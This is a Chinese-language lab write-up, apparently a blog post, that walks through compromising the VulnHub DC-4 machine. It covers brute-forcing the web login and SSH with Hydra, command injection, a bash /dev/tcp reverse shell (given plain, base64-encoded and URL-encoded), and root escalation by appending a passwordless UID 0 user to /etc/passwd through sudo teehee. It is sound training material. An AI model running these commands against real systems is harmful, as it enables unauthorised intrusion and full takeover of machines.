---
cover: /images/VulnHub.jpg
title: VulnHub DC-4 靶机渗透测试笔记
categories:
  - vulnhub-DC
tags:
  - 靶机渗透
  - VulnHub
  - vulnhub-DC
  - 提权
abbrlink: 69aac692
date: 2026-03-13 12:00:00# VulnHub DC-4 靶机渗透测试笔记

> **靶机信息**
> - 靶机名称：DC-4
> - 靶机来源：VulnHub
> - 目标：获取 root 权限，找到最终 flag
> - 难度：⭐⭐⭐☆☆（中等）
> - 涉及技术：信息收集、Web 密码爆破、命令注入、反弹 Shell、SSH 爆破、sudo 提权

---

## 一、信息收集

### 1.1 主机发现

```bash
ifconfig
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image1.png)

本机 IP：`192.168.168.128`

```bash
nmap -sn 192.168.168.0/24
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image2.png)

**扫描结果**

- 192.168.168.1 → VM8 网卡
- 192.168.168.2 → 网关
- 192.168.168.128 → Kali 本机
- 192.168.168.130 → 靶机 DC-4（后面出问题了，重装了一下，分配了169）
- 192.168.168.254 → DHCP 服务器

### 1.2 端口与服务扫描

```bash
nmap -p- -A 192.168.168.130
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image3.png)

开放了 22 和 80，80 是 Web 服务。

---

## 二、Web 信息收集

### 2.1 访问网站

访问目标网站，什么都没有：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image4.png)

页面源码也没什么：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image5.png)

### 2.2 目录扫描

```bash
dirsearch -u http://192.168.168.130/
```

好像也没什么：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image6.png)

插件也什么都没有：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image7.png)

### 2.3 检查 SSH 和 Nginx 版本漏洞

对了 SSH 和 Nginx 有没有版本漏洞？

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image8.png)

感觉都不行，那只能爆破了。

---

## 三、Web 登录爆破

### 3.1 Burp Suite 爆破

bp 爆破用的 fuzzDicts 字典里的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image9.png)

跑出来了：`admin / happy`

登录：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image10.png)

### 3.2 Hydra 爆破（更快）

还有这种简单的密码爆破，没有什么验证，可以使用 hydra 爆破，比 bp 快多了：

```bash
hydra -l admin -P rockyou.txt 192.168.168.169 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
```

**简单拆解如下**

- hydra: 启动爆破工具。
- -l admin: 指定登录账号是 admin。
- -P rockyou.txt: 使用 rockyou.txt 这个巨大的字典来试密码。
- 192.168.168.130: 靶场的 IP 地址。
- http-post-form: 告诉工具这是个网页登录表单。
- "/login.php...S=logout":
  - 去 /login.php 页面试。
  - ^USER^ 和 ^PASS^ 就是爆破的内容
  - username 和 password 就是网页里面的表单值（一般是这样的，可以 F12 确定一下）
- 关键点：如果登录后页面出现了 logout 这个词，说明登录成功了！
- -F: 只要试对一个密码，就赶紧停下来。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image15.png)

很快，半分钟不要就跑出来了。

> 备注：这里遇到个问题，只有谷歌浏览器能登录账号密码，bp 内置的谷歌和 edge 都登不上，后来发现和 cookie 有关，能把谷歌里的 cookie 写到 bp 里就能重新登了，又是环境问题，重装了一下，全都好了，ip 变成了 169。

---

## 四、命令注入

### 4.1 发现命令执行功能

点击命令里面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image11.png)

List Files：You have selected: ls -l

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image12.png)

Disk Usage：You have selected: du -h

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image13.png)

Disk Free：You have selected: df -h

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image14.png)

### 4.2 抓包分析

bp 抓包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image16.png)

`radio=whoami` 这就是个命令执行的地方。

### 4.3 反弹 Shell

```bash
bash -i >& /dev/tcp/192.168.168.128/5678 0>&1
```

base64 编码后发送：

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2OC4xMjgvNTY3OCAwPiYx | base64 -d | bash
```

URL 编码版本：

```
echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE2OC4xMjgvNTY3OCAwPiYx%20%7C%20base64%20%2Dd%20%7C%20bash
```

Kali 监听：

```bash
nc -lvnp 5678
```

成功监听到：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image17.png)

---

## 五、后渗透信息收集

### 5.1 查看基础信息

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image18.png)

### 5.2 sudo 权限查看

sudo -l 提示无 tty：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image19.png)

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

再次输入 sudo -l：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image20.png)

需要密码，happy 密码错误（正确才奇怪，都不是同一个东西）。

### 5.3 SUID 文件查找

```bash
find / -perm -u=s 2>/dev/null
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image21.png)

最后有一个 sh，得注意一下：`/home/jim/test.sh`

### 5.4 查看 /etc/passwd

```bash
cat /etc/passwd
```

找到点信息，exim4 有很多已知提权漏洞：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image22.png)

查看到有三个用户：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image23.png)

charles、jim、sam

### 5.5 翻查用户目录

分别看看里面有什么：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image24.png)

```bash
cat test.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image25.png)

"学 bash 吧，他们说。" "bash 很好用，他们说。" "但我宁愿用头撞墙。"

没什么用。

mbox 没权限：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image26.png)

有个密码备份：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image27.png)

```bash
cat old-passwords.bak
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image28.png)

一个密码本，内容不是很多，直接鼠标复制。

---

## 六、SSH 爆破

### 6.1 创建用户名字典

```bash
echo -e "jim\ncharles\nsammy" > users.txt
```

- `-e` 参数是为了把 `\n` 识别为换行（转义符）
- `>` 为覆盖
- `>>` 为追加

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image30.png)

### 6.2 Hydra 爆破 SSH

```bash
hydra -L users.txt -P ./passwd.txt 192.168.168.169 ssh
```

**hydra 常用参数：**

| 参数 | 说明 |
|------|------|
| -l | 指定单个用户名 |
| -L | 指定用户名字典文件 |
| -p | 指定单个密码 |
| -P | 指定密码字典文件 |
| -t | 并发线程数（默认16，SSH建议4） |
| -v | 显示详细过程 |
| -o | 结果保存到文件 |
| -s | 指定端口 |

爆破出一个：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image31.png)

`login: jim   password: jibril04`

---

## 七、SSH 登录与横向移动

### 7.1 登录 jim

```bash
ssh jim@192.168.168.169
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image32.png)

连接上了，没有 sudo 可用。

### 7.2 查看邮件

看一下之前打不开的 mbox：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image33.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image34.png)

去邮箱里找，之前找到过 exim4 服务：`Debian-exim:x:108:112::/var/spool/exim4:/bin/false`

/var/spool/exim4 无权限进不去：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image35.png)

计划任务也没权限看：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image36.png)

mail 里面有个 www-data 没权限看，只能看 jim：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image37.png)

在邮件里找到密码：`Password is: ^xHhA&hvim0y`

### 7.3 切换到 charles

su - charles 和 su charles 的区别：

- su charles → 切换用户，但保留当前环境变量和目录
- su - charles → 切换用户，同时加载 charles 的完整登录环境（PATH、HOME等全部重置）

```bash
su - charles
sudo -l
```

找到 teehee。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image38.png)

---

## 八、teehee 提权

还想在 https://gtfobins.org/ 里找的，结果找不到，那就去网上搜：

**teehee 是 tee 命令的变种**，可以把内容写入文件，如果有 sudo 权限执行它，就能以 root 身份往 /etc/passwd 写入新用户：

```bash
echo "hack::0:0:hack:/root:/bin/bash" | sudo teehee -a /etc/passwd
```

这行意思是添加一个**没有密码、UID 为 0（root权限）**的用户 hack，然后：

```bash
su hack
whoami  # root
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image39.png)

成功拿到 flag：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-4_image40.png)

---

## 九、渗透流程总结

```
信息收集（nmap）
    ↓
发现 Web 登录页 → Burp Suite / Hydra 爆破 → admin/happy
    ↓
命令执行功能 → 反弹 Shell → www-data
    ↓
/home/jim/backups/old-passwords.bak → Hydra 爆破 SSH → jim/jibril04
    ↓
jim 邮件中发现密码 → 切换 charles
    ↓
sudo teehee → 写入 /etc/passwd → root → flag ✅
```

---

## 十、涉及工具汇总

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| dirsearch | Web 目录扫描 |
| Burp Suite | 抓包、密码爆破 |
| Hydra | Web 表单 / SSH 密码爆破 |
| nc | 反弹 Shell 监听 |
| teehee | sudo 提权写入 /etc/passwd |

---

> 本文为 VulnHub DC-4 靶机学习笔记，所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。
